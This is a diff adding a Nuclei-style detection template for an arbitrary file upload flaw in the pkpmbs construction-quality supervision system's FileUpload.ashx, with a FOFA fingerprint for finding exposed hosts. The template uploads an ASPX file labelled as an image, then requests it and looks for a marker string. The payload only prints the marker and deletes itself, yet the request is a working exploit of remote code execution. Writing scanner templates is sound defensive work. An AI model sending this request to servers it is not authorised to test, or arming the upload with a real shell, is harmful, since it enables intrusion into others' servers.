@@ -1,0 +1,45 @@
+id: pkpmbs-supervision-fileuploadashx-file-upload
+
+info:
+  name: "pkpmbs 建设工程质量监督系统 FileUpload.ashx 组件任意文件上传"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="2001627082"
+      pkpmbs 建设工程质量监督系统是由湖南建研信息技术股份有限公司开发的工程管理平台，其 FileUpload.ashx 组件在文件存储流程中未正确校验上传文件类型与扩展名，导致攻击者可通过构造恶意请求上传可执行脚本文件，最终实现对目标服务器的远程代码执行。
+  tags: pkpmbs
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /Platform/System/FileUpload.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept-Encoding: gzip
+    Content-Type: multipart/form-data; boundary=----YsOxWxSvj1KyZow1PTsh98fdu6l
+
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l
+    Content-Disposition: form-data; name="file"; filename="NTest.aspx"
+    Content-Type: image/png
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest");System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l
+    Content-Disposition: form-data; name="target"
+
+    /Applications/SkillDevelopAndEHS/
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l--
+- raw:
+  - |
+    GET /Applications/SkillDevelopAndEHS/NTest.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
